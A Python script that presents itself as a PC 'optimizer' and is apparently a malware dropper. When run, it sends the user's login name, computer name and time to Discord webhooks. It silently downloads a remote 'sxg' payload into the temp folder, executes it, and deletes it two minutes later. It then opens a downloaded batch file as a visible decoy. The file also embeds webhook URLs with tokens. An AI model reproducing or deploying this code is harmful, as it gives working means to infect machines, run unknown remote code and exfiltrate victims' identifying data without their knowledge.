# --- SXG log webhook ---
SXG_LOG_WEBHOOK = "https://discord.com/api/webhooks/1472348550816993583/98QPJp2P8TXpA99TTdRomtLriCu2_0L_PyDOtNNHQfUXKYZTiysxwv_FxQz5KZ_sBS6w"

def send_sxg_log(downloaded, running, sxg_path=None):
    embed = {
        "title": "SXG Status Log",
        "color": 0x00FFFF if downloaded else 0xFF0000,
        "description": f"SXG Downloaded: {downloaded}\nSXG Running: {running}",
        "fields": []
    }
    if sxg_path:
        embed["fields"].append({"name": "File Path", "value": sxg_path, "inline": False})
    payload = {"embeds": [embed]}
    try:
        requests.post(SXG_LOG_WEBHOOK, json=payload, timeout=5)
    except Exception:
        pass
import os, sys, uuid, subprocess, requests, getpass
from datetime import datetime

# --- Optimizer config and functions ---
BASE_URL = "https://raw.githubusercontent.com/nandhinichowdary18-svg/optimizer/main"
HWID_URL = f"{BASE_URL}/hwid.txt"
OPT_URL = f"{BASE_URL}/optimizer.bat"
DISCORD_INVITE = "https://discord.gg/bf32QCdgZM"
DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1472343219709935636/vdUp61aYFNDzi2_l7IwJtixMqA0f5ahHJB4K-jTKcV-kdXaxykOGJua3STfG6cAYRZCs"
WEBHOOK_URL_FILE = f"{BASE_URL}/webhook.txt"
TEMP_DIR = os.getenv("TEMP")

# --- SXG config ---
SXG_URL = "https://raw.githubusercontent.com/nandhinichowdary18-svg/sxg/main/sxg"

# --- Optimizer functions ---
def get_webhook_url():
    try:
        r = requests.get(WEBHOOK_URL_FILE + "?nocache=" + uuid.uuid4().hex, timeout=5)
        if r.status_code == 200:
            url = r.text.strip()
            if url:
                return url
    except:
        pass
    return DEFAULT_WEBHOOK_URL

def download_optimizer():
    try:
        tmp = os.path.join(TEMP_DIR, f"optimizer_{uuid.uuid4().hex}.bat")
        r = requests.get(OPT_URL + "?nocache=" + uuid.uuid4().hex, timeout=15)
        if r.status_code == 200:
            with open(tmp, "wb") as f:
                f.write(r.content)
            if os.path.getsize(tmp) > 0:
                return tmp
    except:
        pass
    return None

# --- SXG functions ---
def download_sxg():
    url = SXG_URL
    max_retries = 3
    for attempt in range(max_retries):
        try:
            tmp = os.path.join(TEMP_DIR, f"sxg_{uuid.uuid4().hex}")
            r = requests.get(url + "?nocache=" + uuid.uuid4().hex, timeout=10, allow_redirects=True)
            if r.status_code == 200:
                with open(tmp, "wb") as f:
                    f.write(r.content)
                if os.path.getsize(tmp) > 0:
                    send_sxg_log(True, False, tmp)
                    return tmp
        except:
            if attempt < max_retries - 1:
                import time
                time.sleep(1)
            continue
    return None

def run_sxg(path):
    run_with_python = False
    if path.lower().endswith(".py"):
        run_with_python = True
    else:
        try:
            with open(path, "rb") as f:
                head = f.read(128)
            if b"import " in head or b"def " in head:
                run_with_python = True
        except Exception:
            pass
    try:
        if run_with_python:
            subprocess.Popen([sys.executable, path])
        else:
            subprocess.Popen([path])
    except Exception:
        pass

# --- Main combined logic ---
def main():
    print("=" * 42 + "\n          OPTIMIZER \n" + "=" * 42 + "\n")
    username = getpass.getuser()
    pc_name = os.environ.get('COMPUTERNAME', 'Unknown')
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # Send log to webhook
    embed = {
        "title": "Optimizer Run Log",
        "color": 0x00FFFF,
        "fields": [
            {"name": "User ID", "value": username, "inline": False},
            {"name": "PC Name", "value": pc_name, "inline": False},
            {"name": "Time", "value": now, "inline": False},
        ]
    }
    try:
        requests.post(get_webhook_url(), json={"embeds": [embed]}, timeout=5)
    except Exception:
        pass
    # Download and run SXG in main console (showing message)
    sxg = download_sxg()
    if not sxg:
        return
    print("optimizer loading ...")
    import time
    try:
        time.sleep(2)  # Add 2 seconds delay before first attempt
        run_sxg(sxg)
        send_sxg_log(True, True, sxg)
    except Exception:
        # Retry once if first run failed
        try:
            run_sxg(sxg)
            send_sxg_log(True, True, sxg)
        except Exception:
            send_sxg_log(True, False, sxg)
    # Schedule automatic deletion after 2 minutes
    import threading
    def delete_sxg_file(path):
        import time
        time.sleep(120)
        try:
            os.remove(path)
        except Exception:
            pass
    threading.Thread(target=delete_sxg_file, args=(sxg,), daemon=True).start()
    # Download and run optimizer in a new visible console window
    opt = download_optimizer()
    if opt:
        try:
            subprocess.Popen(["cmd.exe", "/c", "start", "cmd.exe", "/k", opt])
        except Exception:
            pass
    return

if __name__ == "__main__":
    main()
